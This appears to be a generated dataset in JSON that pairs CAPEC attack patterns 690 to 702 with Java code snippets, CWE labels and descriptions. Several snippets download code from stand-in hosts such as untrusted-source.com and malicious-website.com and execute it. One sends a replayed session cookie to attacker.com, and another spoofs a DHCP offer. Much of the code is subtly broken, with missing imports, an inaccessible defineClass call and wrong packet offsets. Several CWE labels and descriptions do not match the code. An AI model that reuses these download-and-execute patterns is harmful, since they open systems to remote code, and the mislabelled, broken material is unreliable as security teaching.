    {
        "capec_id": "690",
        "code_snippet": "import java.io.File;\nimport java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.InputStream;\nimport java.util.jar.JarEntry;\nimport java.util.jar.JarInputStream;\n\npublic class MaliciousResource {\n    public static void main(String[] args) throws Exception {\n        // CWE-348: Using less trusted source\n        URL url = new URL(\"http://untrusted-source.com/malicious.jar\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.connect();\n\n        // CWE-290: Authentication Bypass by Spoofing\n        String fakeMetadata = \"Metadata-From-Untrusted-Source\";\n        connection.setRequestProperty(\"Metadata\", fakeMetadata);\n\n        // CWE-1230: Exposure of Sensitive Information Through Metadata\n        File file = new File(\"malicious.jar\");\n        file.setReadable(true, false);\n        file.setWritable(true, false);\n        file.setExecutable(true, false);\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        JarInputStream jarStream = new JarInputStream(connection.getInputStream());\n        JarEntry entry;\n        while ((entry = jarStream.getNextJarEntry()) != null) {\n            // CWE-494: Download of Code Without Integrity Check\n            if (entry.getName().endsWith(\".class\")) {\n                byte[] classBytes = new byte[(int) entry.getSize()];\n                jarStream.read(classBytes, 0, (int) entry.getSize());\n                // Load and execute the malicious class\n                ClassLoader loader = new MyClassLoader();\n                Class<?> clazz = loader.defineClass(entry.getName(), classBytes, 0, (int) entry.getSize());\n                clazz.newInstance();\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of altering metadata to present a malicious resource as legitimate. It uses multiple CWEs to achieve this: CWE-348 by using an untrusted source, CWE-290 by spoofing metadata, CWE-1230 by exposing sensitive information through metadata, CWE-941 by incorrectly specifying the destination, and CWE-494 by downloading code without integrity checks. The code downloads a malicious JAR file from an untrusted source, spoofs its metadata, and executes the malicious code without verifying its origin or integrity."
    },
    {
        "capec_id": "691",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class MaliciousDependency {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"https://example.com/malicious-dependency.jar\");\n        URLConnection connection = url.openConnection();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            // Execute the malicious code\n            Runtime.getRuntime().exec(line);\n        }\n    }\n}\n",
        "description": "This Java code snippet downloads a JAR file from an untrusted source and executes the code without verifying its integrity or origin, making it vulnerable to CWE-494. The code also uses a less trusted source (CWE-348) and may contain embedded malicious code (CWE-506). The authentication scheme is also vulnerable to spoofing attacks (CWE-290), and the dependency on the third-party component may contain known vulnerabilities (CWE-1395)."
    },
    {
        "capec_id": "692",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class GitRepositoryDownloader {\n    public static void main(String[] args) {\n        String gitRepositoryUrl = \"https://example.com/malicious-git-repo.git\";\n        String localRepositoryPath = \"./local-repo\";\n\n        try {\n            URL url = new URL(gitRepositoryUrl);\n            URLConnection connection = url.openConnection();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n\n            // Download the Git repository without verifying its integrity\n            String line;\n            while ((line = reader.readLine()) != null) {\n                // Execute the downloaded code without checking its origin\n                Runtime.getRuntime().exec(line);\n            }\n\n            // Clone the Git repository to a local directory without access control\n            Runtime.getRuntime().exec(\"git clone \" + gitRepositoryUrl + \" \" + localRepositoryPath);\n        } catch (IOException e) {\n            System.out.println(\"Error downloading Git repository: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC by downloading a Git repository from a malicious URL without verifying its integrity, and then executing the downloaded code without checking its origin. The code also clones the repository to a local directory without access control, exposing the repository to unauthorized access. This code embodies CWE-494, CWE-527, CWE-348, CWE-508, and CWE-540."
    },
    {
        "capec_id": "693",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class MaliciousPackage {\n    public static void main(String[] args) throws IOException {\n        String url = \"https://malicious-repo.com/package.zip\";\n        URL website = new URL(url);\n        URLConnection connection = website.openConnection();\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            // execute the downloaded code without integrity check\n            Runtime.getRuntime().exec(inputLine);\n        }\n        in.close();\n    }\n}\n",
        "description": "This Java code snippet downloads a package from a malicious repository and executes the code without verifying its origin and integrity, making it vulnerable to CWE-494. The code also uses a less trusted source (CWE-348) and may contain embedded malicious code (CWE-506). Additionally, it may be dependent on a vulnerable third-party component (CWE-1395) and expose a version-control repository to an unauthorized control sphere (CWE-527)."
    },
    {
        "capec_id": "694",
        "code_snippet": "public class SystemInfoExposer {\n    public static void exposeSystemInfo() {\n        try {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String systemLanguage = System.getProperty(\"user.language\");\n            String timeZone = System.getProperty(\"user.timezone\");\n            String keyboardLayout = System.getProperty(\"awt.toolkit\");\n            System.out.println(\"System Language: \" + systemLanguage);\n            System.out.println(\"Time Zone: \" + timeZone);\n            System.out.println(\"Keyboard Layout: \" + keyboardLayout);\n\n            // CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n            String aclFilePath = \"/path/to/access/control/list/file\";\n            File aclFile = new File(aclFilePath);\n            if (aclFile.exists()) {\n                System.out.println(\"Access Control List File: \" + aclFile.getAbsolutePath());\n            }\n\n            // CWE-360: Trust of System Event Data\n            String eventLocation = System.getProperty(\"user.home\") + \"/.eventLog\";\n            File eventFile = new File(eventLocation);\n            if (eventFile.exists()) {\n                System.out.println(\"Event Location: \" + eventFile.getAbsolutePath());\n            }\n\n            // CWE-222: Truncation of Security-relevant Information\n            String securityInfo = \"This is a security-relevant information that might be truncated\";\n            System.out.println(\"Security Info: \" + securityInfo.substring(0, 10));\n\n            // CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n            // This CWE is related to processor events and is not directly applicable to Java code.\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n    public static void main(String[] args) {\n        exposeSystemInfo();\n    }\n}",
        "description": "This Java code snippet exposes sensitive system information, including system language, time zone, and keyboard layout, which can be used by an adversary to identify the system's geographical location. It also demonstrates exposure of access control list files, trust of system event data, truncation of security-relevant information, and incorrect data forwarding during transient execution, which are all related to the CWEs mentioned."
    },
    {
        "capec_id": "695",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousCodeDownloader {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        String maliciousRepoUrl = \"https://example.com/malicious-repo.git\";\n        String maliciousLibraryUrl = \"https://example.com/malicious-library.jar\";\n\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        Process process = Runtime.getRuntime().exec(\"git clone \" + maliciousRepoUrl);\n        process.waitFor();\n\n        // CWE-494: Download of Code Without Integrity Check\n        URL url = new URL(maliciousLibraryUrl);\n        URLClassLoader classLoader = new URLClassLoader(new URL[] { url });\n        Class<?> maliciousClass = classLoader.loadClass(\"MaliciousClass\");\n        maliciousClass.getMethod(\"executeMaliciousCode\").invoke(null);\n\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        // CWE-426: Untrusted Search Path\n        System.setProperty(\"java.library.path\", \"./malicious-repo/lib\");\n        System.loadLibrary(\"malicious-library\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary taking advantage of the redirect property of directly linked Version Control System (VCS) repositories to trick users into incorporating malicious code into their applications. It includes CWE-527 by cloning a malicious Git repository, CWE-494 by downloading and executing a malicious JAR file without integrity checks, CWE-829 by including functionality from an untrusted control sphere, and CWE-426 by using an untrusted search path for loading a malicious library."
    },
    {
        "capec_id": "696",
        "code_snippet": "public class TransientExecutionAttack {\n    public static void main(String[] args) {\n        // CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n        int[] array = new int[1024];\n        for (int i = 0; i < 1024; i++) {\n            array[i] = i;\n        }\n        // Induce a page fault or microcode assist\n        try {\n            array[1024] = 0;\n        } catch (ArrayIndexOutOfBoundsException e) {\n            // Do nothing\n        }\n        // CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution\n        int predictorState = getPredictorState();\n        // CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n        int forwardedData = getForwardedData();\n        // CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\n        int restrictedData = getRestrictedData();\n        // Use existing code gadgets and side channel analysis to discover victim secrets\n        analyzeMicroarchitecturalState(array, predictorState, forwardedData, restrictedData);\n    }\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    public static void injectErrorIntoRedundantBlock() {\n        // Simulate error injection into a redundant block\n        System.out.println(\"Error injected into redundant block\");\n    }\n    public static int getPredictorState() {\n        // Return the shared microarchitectural predictor state\n        return 0;\n    }\n    public static int getForwardedData() {\n        // Return the forwarded data\n        return 0;\n    }\n    public static int getRestrictedData() {\n        // Return the restricted data\n        return 0;\n    }\n    public static void analyzeMicroarchitecturalState(int[] array, int predictorState, int forwardedData, int restrictedData) {\n        // Analyze the microarchitectural state to discover victim secrets\n        System.out.println(\"Analyzing microarchitectural state...\");\n    }\n}",
        "description": "This Java code snippet demonstrates a Transient Execution Attack, which exploits a hardware design flaw in CPU implementations. The code induces a page fault or microcode assist, allowing an adversary to force legitimate victim execution to operate on adversary-controlled data stored in microarchitectural buffers. The code then uses existing code gadgets and side channel analysis to discover victim secrets that have not yet been flushed from microarchitectural state or hijack the system control flow."
    },
    {
        "capec_id": "697",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class MaliciousDHCP {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(67);\n        InetAddress address = InetAddress.getByName(\"255.255.255.255\");\n        byte[] data = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, 68);\n\n        // Spoofing DHCP traffic by sending a malicious DHCP offer packet\n        data[0] = (byte) 0x02; // Message type: DHCPOFFER\n        data[1] = (byte) 0x01; // Hardware type: Ethernet\n        data[2] = (byte) 0x06; // Hardware address length\n        data[3] = (byte) 0x00; // Hops\n        data[4] = (byte) 0x39; // Transaction ID\n        data[5] = (byte) 0x39; // Transaction ID\n        data[6] = (byte) 0x39; // Transaction ID\n        data[7] = (byte) 0x39; // Transaction ID\n        data[8] = (byte) 0x00; // Seconds elapsed\n        data[9] = (byte) 0x00; // Flags\n        data[10] = (byte) 0x00; // CIADDR\n        data[11] = (byte) 0x00; // CIADDR\n        data[12] = (byte) 0x00; // CIADDR\n        data[13] = (byte) 0x00; // CIADDR\n        data[14] = (byte) 0x00; // YIADDR\n        data[15] = (byte) 0x00; // YIADDR\n        data[16] = (byte) 0x00; // YIADDR\n        data[17] = (byte) 0x00; // YIADDR\n        data[18] = (byte) 0x00; // SIADDR\n        data[19] = (byte) 0x00; // SIADDR\n        data[20] = (byte) 0x00; // SIADDR\n        data[21] = (byte) 0x00; // SIADDR\n        data[22] = (byte) 0x63; // GIADDR\n        data[23] = (byte) 0x82; // GIADDR\n        data[24] = (byte) 0x53; // GIADDR\n        data[25] = (byte) 0x63; // GIADDR\n\n        // Malicious IP address\n        data[28] = (byte) 0x7f; // IP address\n        data[29] = (byte) 0x00; // IP address\n        data[30] = (byte) 0x00; // IP address\n        data[31] = (byte) 0x01; // IP address\n\n        socket.send(packet);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious DHCP server that spoofs DHCP traffic to redirect network traffic or deny service to legitimate DHCP clients. It uses a DatagramSocket to send a malicious DHCP offer packet with a spoofed IP address, bypassing authentication and allowing the attacker to masquerade as a legitimate DHCP server."
    },
    {
        "capec_id": "698",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\nimport java.io.File;\n\npublic class MaliciousExtension {\n    public static void main(String[] args) throws Exception {\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        URL url = new URL(\"http://malicious-website.com/malicious-library.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[] { url });\n        Class<?> clazz = loader.loadClass(\"MaliciousClass\");\n        clazz.getMethod(\"maliciousMethod\").invoke(null);\n\n        // CWE-494: Download of Code Without Integrity Check\n        URL downloadUrl = new URL(\"http://malicious-website.com/malicious-code.txt\");\n        File file = new File(\"malicious-code.txt\");\n        FileUtils.copyURLToFile(downloadUrl, file);\n        Runtime.getRuntime().exec(\"java -jar malicious-code.txt\");\n\n        // CWE-426: Untrusted Search Path\n        System.setProperty(\"java.library.path\", \"./untrusted-library\");\n        System.loadLibrary(\"untrusted-library\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious extension that exploits multiple vulnerabilities. It downloads and loads a malicious JAR file from an untrusted source, executes a malicious method, downloads and executes unverified code, and sets an untrusted search path for loading native libraries. This code embodies the CAPEC of installing or tricking a user into installing a malicious extension into existing trusted software."
    },
    {
        "capec_id": "699",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class VulnerableMonitorSignal {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"localhost\");\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"confidentialInformation\";\n        byte[] dataBytes = sensitiveData.getBytes();\n        packet.setData(dataBytes);\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // CWE-514: Covert Channel\n        // CWE-515: Covert Storage Channel\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        while (true) {\n            socket.send(packet);\n            // The signal emitted by the cable or video port can be captured\n            // by an adversary, allowing them to eavesdrop on the content\n            // of the external monitor without modifying any cable or\n            // installing software.\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable scenario where sensitive data is transmitted in cleartext over a network, allowing an adversary to eavesdrop on the content of an external monitor through the air without modifying any cable or installing software. The code uses a DatagramSocket to send sensitive data in plaintext, which can be captured by an attacker. This code embodies the main idea of the CAPEC, which involves exploiting physical side channels to compromise data confidentiality."
    },
    {
        "capec_id": "700",
        "code_snippet": "public class BoundaryDeviceBridge {\n    private Socket trustedSocket;\n    private Socket untrustedSocket;\n    \n    public BoundaryDeviceBridge(Socket trustedSocket, Socket untrustedSocket) {\n        this.trustedSocket = trustedSocket;\n        this.untrustedSocket = untrustedSocket;\n    }\n    \n    public void bridgeChannels() {\n        // CWE-923: No verification of endpoint identity\n        // CWE-300: No verification of channel integrity\n        BufferedReader trustedReader = new BufferedReader(new InputStreamReader(trustedSocket.getInputStream()));\n        PrintWriter untrustedWriter = new PrintWriter(untrustedSocket.getOutputStream(), true);\n        \n        String message;\n        while ((message = trustedReader.readLine()) != null) {\n            // CWE-501: Mixing trusted and untrusted data\n            untrustedWriter.println(\"Untrusted prefix: \" + message);\n        }\n    }\n    \n    public void sendUntrustedMessage(String message) {\n        // CWE-924: No message integrity check\n        PrintWriter trustedWriter = new PrintWriter(trustedSocket.getOutputStream(), true);\n        trustedWriter.println(message);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a boundary device bridge that allows an adversary to create a channel between trusted and untrusted networks. The bridge does not properly verify the identity of endpoints, does not ensure the integrity of the communication channel, and mixes trusted and untrusted data. It also fails to check the integrity of messages during transmission."
    },
    {
        "capec_id": "701",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.net.URLEncoder;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class RemoteDesktopExploit {\n    public static void main(String[] args) throws IOException {\n        String url = \"http://attacker.com/remoteDesktopSession\";\n        String authCookie = getAuthenticationCookie(); // CWE-294: Authentication Bypass by Capture-replay\n        String request = \"GET \" + url + \" HTTP/1.1\\r\\n\";\n        request += \"Cookie: \" + authCookie + \"\\r\\n\";\n        request += \"\\r\\n\";\n\n        URL obj = new URL(url);\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n        con.setRequestMethod(\"GET\");\n        con.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n        con.setRequestProperty(\"Cookie\", authCookie);\n\n        int responseCode = con.getResponseCode();\n        if (responseCode == 200) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            // CWE-345: Insufficient Verification of Data Authenticity\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            // CWE-368: Context Switching Race Condition\n            // CWE-830: Inclusion of Web Functionality from an Untrusted Source\n            String remoteDesktopHtml = response.toString();\n            // Include the remote desktop HTML in the current page\n            // This will allow the attacker to establish a remote desktop connection\n            // without the user's knowledge or consent\n        }\n    }\n\n    private static String getAuthenticationCookie() {\n        // CWE-294: Authentication Bypass by Capture-replay\n        // Sniff network traffic and replay the authentication cookie\n        // to bypass authentication\n        return \"JSESSIONID=sniffedCookie\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates a remote desktop exploit that bypasses authentication using a captured cookie, includes web functionality from an untrusted source, and lacks sufficient verification of data authenticity. The code establishes a connection to the attacker's remote desktop session, allowing the attacker to gain unauthorized access to the victim's system."
    },
    {
        "capec_id": "702",
        "code_snippet": "public class DebugComponent {\n    private boolean isAdmin = false;\n    private boolean isDebugEnabled = false;\n\n    public void enableDebugMode() {\n        isDebugEnabled = true;\n    }\n\n    public void executeDebugFunctionality(String functionName) {\n        if (isDebugEnabled) {\n            if (functionName.equals(\"readInternalRegisters\")) {\n                readInternalRegisters();\n            } else if (functionName.equals(\"injectErrorIntoRedundantBlock\")) {\n                injectErrorIntoRedundantBlock();\n            } else if (functionName.equals(\"skipSecurityCriticalInstructions\")) {\n                skipSecurityCriticalInstructions();\n            } else if (functionName.equals(\"storeTraceData\")) {\n                storeTraceData(\"unprotectedLocation\");\n            }\n        }\n    }\n\n    private void readInternalRegisters() {\n        // read internal registers without checking authorization\n    }\n\n    private void injectErrorIntoRedundantBlock() {\n        // inject error into redundant block without checking authorization\n    }\n\n    private void skipSecurityCriticalInstructions() {\n        // skip security-critical instructions without checking authorization\n    }\n\n    private void storeTraceData(String location) {\n        // store trace data in unprotected location without checking authorization\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of incorrect chaining or granularity of hardware debug components. The DebugComponent class allows enabling debug mode and executing various debug functionalities without checking authorization on a per-function basis. This can lead to unauthorized access to internal registers, error injection into redundant blocks, skipping of security-critical instructions, and storage of trace data in unprotected locations."
    }
]